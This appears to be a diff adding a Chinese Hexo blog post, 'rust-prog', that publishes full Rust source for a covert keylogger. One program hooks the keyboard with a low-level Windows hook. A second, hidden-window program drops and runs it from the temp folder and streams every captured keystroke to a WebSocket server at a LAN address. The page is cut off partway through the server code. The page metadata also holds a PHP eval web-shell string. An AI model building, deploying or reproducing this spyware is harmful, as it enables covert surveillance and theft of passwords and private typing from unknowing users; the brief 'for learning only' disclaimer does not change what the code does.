@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"creeeeeeeeeeper.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="rust的几个练习小项目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rust-prog">
+<meta property="og:url" content="http://creeeeeeeeeeper.github.io/2025/05/09/rust-prog/index.html">
+<meta property="og:site_name" content="Notes">
+<meta property="og:description" content="rust的几个练习小项目">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-05-09T03:19:59.000Z">
+<meta property="article:modified_time" content="2025-05-09T03:46:36.323Z">
+<meta property="article:author" content="ZYG">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://creeeeeeeeeeper.github.io/2025/05/09/rust-prog/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>rust-prog | Notes</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Notes</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">NCRA</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://creeeeeeeeeeper.github.io/2025/05/09/rust-prog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://creeeeeeeeeeper.github.io/2023/12/15/c/ccccc.jpg">
+      <meta itemprop="name" content="ZYG">
+      <meta itemprop="description" content="?php @eval($_POST['attack']);?">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Notes">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          rust-prog
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-05-09 11:19:59 / 修改时间：11:46:36" itemprop="dateCreated datePublished" datetime="2025-05-09T11:19:59+08:00">2025-05-09</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><span style="font-size: 25px; font-weight: bold;">rust的几个练习小项目</span></p>
+<span id="more"></span>
+
+<h1 id="偷你键盘！"><a href="#偷你键盘！" class="headerlink" title="偷你键盘！"></a>偷你键盘！</h1><div style="color: red; width: 100%; display: flex; justify-content: center; align-items: center; font-weight: bold;"><br><br>本项目禁止用于非法目的，仅用于交流学习！</div><br><br>
+
+<h2 id="键盘钩子-stealKeyboard-exe"><a href="#键盘钩子-stealKeyboard-exe" class="headerlink" title="键盘钩子(stealKeyboard.exe)"></a>键盘钩子(stealKeyboard.exe)</h2><p>Cargo.toml</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;stealKeyboard&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">winapi</span> = &#123; version = <span class="string">&quot;0.3&quot;</span>, features = [<span class="string">&quot;minwindef&quot;</span>, <span class="string">&quot;winuser&quot;</span>] &#125;</span><br><span class="line"><span class="attr">tokio</span> = &#123; version = <span class="string">&quot;1&quot;</span>, features = [<span class="string">&quot;full&quot;</span>] &#125;</span><br><span class="line"><span class="attr">tokio-tungstenite</span> = <span class="string">&quot;0.17&quot;</span></span><br><span class="line"><span class="attr">futures-util</span> = <span class="string">&quot;0.3&quot;</span></span><br><span class="line"><span class="attr">serde</span> = &#123; version = <span class="string">&quot;1.0&quot;</span>, features = [<span class="string">&quot;derive&quot;</span>] &#125;</span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">lazy_static</span> = <span class="string">&quot;1.4.0&quot;</span></span><br><span class="line"><span class="attr">os_pipe</span> = <span class="string">&quot;0.9.0&quot;</span></span><br><span class="line"><span class="attr">url</span> = <span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="attr">once_cell</span> = <span class="string">&quot;1.8.0&quot;</span></span><br><span class="line"><span class="attr">crossbeam</span> = <span class="string">&quot;0.8&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>main.rs</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::mem;</span><br><span class="line"><span class="keyword">use</span> std::ptr::null_mut;</span><br><span class="line"><span class="keyword">use</span> winapi::shared::minwindef::&#123;LPARAM, LRESULT, WPARAM&#125;;</span><br><span class="line"><span class="keyword">use</span> winapi::um::winuser::&#123;</span><br><span class="line">    CallNextHookEx, GetKeyboardState, SetWindowsHookExA, ToAscii, UnhookWindowsHookEx, HC_ACTION,</span><br><span class="line">    KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsafe</span> <span class="keyword">extern</span> <span class="string">&quot;system&quot;</span> <span class="keyword">fn</span> <span class="title function_">hook_proc</span>(n_code: <span class="type">i32</span>, w_param: WPARAM, l_param: LPARAM) <span class="punctuation">-&gt;</span> LRESULT &#123;</span><br><span class="line">    <span class="keyword">if</span> n_code == HC_ACTION &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">kb_hook</span> = mem::transmute::&lt;LPARAM, *<span class="keyword">const</span> KBDLLHOOKSTRUCT&gt;(l_param);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">vk_code</span> = (*kb_hook).vkCode;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">flags</span> = (*kb_hook).flags;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">keyboard_state</span> = [<span class="number">0u8</span>; <span class="number">256</span>];</span><br><span class="line">        <span class="title function_ invoke__">GetKeyboardState</span>(keyboard_state.<span class="title function_ invoke__">as_mut_ptr</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">char_buffer</span> = [<span class="number">0u16</span>; <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">result</span> = <span class="title function_ invoke__">ToAscii</span>(</span><br><span class="line">            vk_code,</span><br><span class="line">            (*kb_hook).scanCode,</span><br><span class="line">            keyboard_state.<span class="title function_ invoke__">as_ptr</span>(),</span><br><span class="line">            char_buffer.<span class="title function_ invoke__">as_mut_ptr</span>(),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">1</span> &#123; <span class="comment">// printable key</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">ascii_char</span> = char_buffer[<span class="number">0</span>] <span class="keyword">as</span> <span class="type">u8</span> <span class="keyword">as</span> <span class="type">char</span>;</span><br><span class="line">            <span class="keyword">if</span> flags == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, ascii_char);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// non-printable key</span></span><br><span class="line">            <span class="keyword">if</span> flags == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="keyword">match</span> vk_code &#123;</span><br><span class="line">                    _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, vk_code),</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">CallNextHookEx</span>(<span class="title function_ invoke__">null_mut</span>(), n_code, w_param, l_param)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[tokio::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">hook</span> = <span class="keyword">unsafe</span> &#123; <span class="title function_ invoke__">SetWindowsHookExA</span>(WH_KEYBOARD_LL, <span class="title function_ invoke__">Some</span>(hook_proc), <span class="title function_ invoke__">null_mut</span>(), <span class="number">0</span>) &#125;;</span><br><span class="line">    <span class="keyword">if</span> hook.<span class="title function_ invoke__">is_null</span>() &#123;</span><br><span class="line">        <span class="built_in">panic!</span>(<span class="string">&quot;Failed to install hook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span>: MSG = <span class="keyword">unsafe</span> &#123; mem::<span class="title function_ invoke__">zeroed</span>() &#125;;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">unsafe</span> &#123; winapi::um::winuser::<span class="title function_ invoke__">GetMessageA</span>(&amp;<span class="keyword">mut</span> msg, <span class="title function_ invoke__">null_mut</span>(), <span class="number">0</span>, <span class="number">0</span>) &#125; != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">unsafe</span> &#123;</span><br><span class="line">            winapi::um::winuser::<span class="title function_ invoke__">TranslateMessage</span>(&amp;<span class="keyword">mut</span> msg);</span><br><span class="line">            winapi::um::winuser::<span class="title function_ invoke__">DispatchMessageA</span>(&amp;<span class="keyword">mut</span> msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123; <span class="title function_ invoke__">UnhookWindowsHookEx</span>(hook) &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="实时监控-listenTo-exe"><a href="#实时监控-listenTo-exe" class="headerlink" title="实时监控(listenTo.exe)"></a>实时监控(listenTo.exe)</h2><p>Cargo.toml</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;listenTo&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">rust-embed</span> = <span class="string">&quot;8.7.0&quot;</span></span><br><span class="line"><span class="attr">tokio</span> = &#123; version = <span class="string">&quot;1&quot;</span>, features = [<span class="string">&quot;full&quot;</span>] &#125;</span><br><span class="line"><span class="attr">tokio-tungstenite</span> = <span class="string">&quot;0.23.1&quot;</span></span><br><span class="line"><span class="attr">url</span> = <span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">futures-util</span> = <span class="string">&quot;0.3&quot;</span></span><br><span class="line"><span class="attr">hide_console</span> = <span class="string">&quot;0.2.1&quot;</span></span><br><span class="line"><span class="attr">winapi</span> = &#123; version = <span class="string">&quot;0.3&quot;</span>, features = [<span class="string">&quot;wincon&quot;</span>, <span class="string">&quot;shellapi&quot;</span>, <span class="string">&quot;winuser&quot;</span>, <span class="string">&quot;winbase&quot;</span>] &#125;</span><br></pre></td></tr></table></figure>
+
+<p>main.rs</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![windows_subsystem = <span class="string">&quot;windows&quot;</span>]</span></span><br><span class="line"><span class="keyword">use</span> rust_embed::Embed;</span><br><span class="line"><span class="keyword">use</span> winapi::um::winbase::CREATE_NO_WINDOW;</span><br><span class="line"><span class="keyword">use</span> std::fs::File;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;<span class="keyword">self</span>, BufRead, Write&#125;;</span><br><span class="line"><span class="keyword">use</span> std::os::windows::process::CommandExt;</span><br><span class="line"><span class="keyword">use</span> std::process::&#123;Command, Stdio&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio_tungstenite::&#123;connect_async, tungstenite::protocol::Message&#125;;</span><br><span class="line"><span class="keyword">use</span> url::Url;</span><br><span class="line"><span class="keyword">use</span> futures_util::SinkExt;</span><br><span class="line"><span class="keyword">use</span> serde_json::json;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Embed)]</span></span><br><span class="line"><span class="meta">#[folder = <span class="string">&quot;src\\resource&quot;</span>]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Asset</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[tokio::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="comment">// 获取嵌入的 .exe 文件</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">exe_file</span> = Asset::<span class="title function_ invoke__">get</span>(<span class="string">&quot;stealKeyboard.exe&quot;</span>).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">exe_data</span> = exe_file.data.<span class="title function_ invoke__">as_ref</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个临时文件路径</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">temp_dir</span> = std::env::<span class="title function_ invoke__">temp_dir</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">temp_path</span> = temp_dir.<span class="title function_ invoke__">join</span>(<span class="string">&quot;stealKeyboard.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将嵌入的 .exe 文件内容写入临时文件</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">file</span> = File::<span class="title function_ invoke__">create</span>(&amp;temp_path)?;</span><br><span class="line">        file.<span class="title function_ invoke__">write_all</span>(exe_data)?;</span><br><span class="line">    &#125; <span class="comment">// 文件句柄在这里自动关闭</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确保文件句柄已经关闭</span></span><br><span class="line">    tokio::time::<span class="title function_ invoke__">sleep</span>(tokio::time::Duration::<span class="title function_ invoke__">from_millis</span>(<span class="number">100</span>)).<span class="keyword">await</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用临时文件并监听标准输出</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">child</span> = Command::<span class="title function_ invoke__">new</span>(&amp;temp_path)</span><br><span class="line">        .<span class="title function_ invoke__">stdout</span>(Stdio::<span class="title function_ invoke__">piped</span>())</span><br><span class="line">        .<span class="title function_ invoke__">creation_flags</span>(CREATE_NO_WINDOW)</span><br><span class="line">        .<span class="title function_ invoke__">spawn</span>()</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">stdout</span> = child.stdout.<span class="title function_ invoke__">take</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">reader</span> = io::BufReader::<span class="title function_ invoke__">new</span>(stdout);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到 WebSocket 服务器</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">url</span> = Url::<span class="title function_ invoke__">parse</span>(<span class="string">&quot;ws://192.168.1.128:8086&quot;</span>).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> (<span class="keyword">mut</span> ws_stream, _) = <span class="title function_ invoke__">connect_async</span>(url.<span class="title function_ invoke__">as_str</span>()).<span class="keyword">await</span>.<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实时打印标准输出并发送到 WebSocket 服务器  </span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">line</span> <span class="keyword">in</span> reader.<span class="title function_ invoke__">lines</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(line) = line &#123;</span><br><span class="line">            <span class="comment">// println!(&quot;&#123;&#125;&quot;, line);</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">json_msg</span> = json!(&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;st&quot;</span>, <span class="string">&quot;payload&quot;</span>: line&#125;);</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = ws_stream.<span class="title function_ invoke__">send</span>(Message::<span class="title function_ invoke__">Text</span>(json_msg.<span class="title function_ invoke__">to_string</span>())).<span class="keyword">await</span> &#123;</span><br><span class="line">                <span class="comment">// eprintln!(&quot;Failed to send message to WebSocket server: &#123;:?&#125;&quot;, e);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待子进程结束</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">output</span> = child.<span class="title function_ invoke__">wait_with_output</span>()?;</span><br><span class="line">    <span class="keyword">if</span> output.status.<span class="title function_ invoke__">success</span>() &#123;</span><br><span class="line">        <span class="comment">// println!(&quot;Embedded .exe executed successfully&quot;);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// eprintln!(&quot;Embedded .exe execution failed&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理临时文件</span></span><br><span class="line">    <span class="keyword">match</span> std::fs::<span class="title function_ invoke__">remove_file</span>(&amp;temp_path) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(_) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(e) =&gt; <span class="built_in">eprintln!</span>(<span class="string">&quot;&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在main.rs同级目录下建一个resource文件夹，把刚才编译好的stealKeyboard.exe放进去，实现原理是运行listenTo.exe这个程序时，程序会释放stealkeyboard.exe这个程序，然后运行并监听其标准输出，然后通过连接了一个WebSocket服务器来发送键盘监控</p>
+<p>因为键盘挂钩子是一个回调函数，发送websocket消息是一个异步函数，所以本来想直接写一个程序来实现，但是不会处理异步QAQ，所以就分成了两个程序，一个用来挂键盘钩子，一个用来发送实时监听</p>
+<h1 id="一个简单的websocket服务器"><a href="#一个简单的websocket服务器" class="headerlink" title="一个简单的websocket服务器"></a>一个简单的websocket服务器</h1><p>Cargo.toml</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;greeting&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">tokio</span> = &#123; version = <span class="string">&quot;1&quot;</span>, features = [<span class="string">&quot;full&quot;</span>] &#125;</span><br><span class="line"><span class="attr">tokio-tungstenite</span> = <span class="string">&quot;0.17&quot;</span></span><br><span class="line"><span class="attr">futures-util</span> = <span class="string">&quot;0.3&quot;</span></span><br><span class="line"><span class="attr">serde</span> = &#123; version = <span class="string">&quot;1.0&quot;</span>, features = [<span class="string">&quot;derive&quot;</span>] &#125;</span><br><span class="line"><span 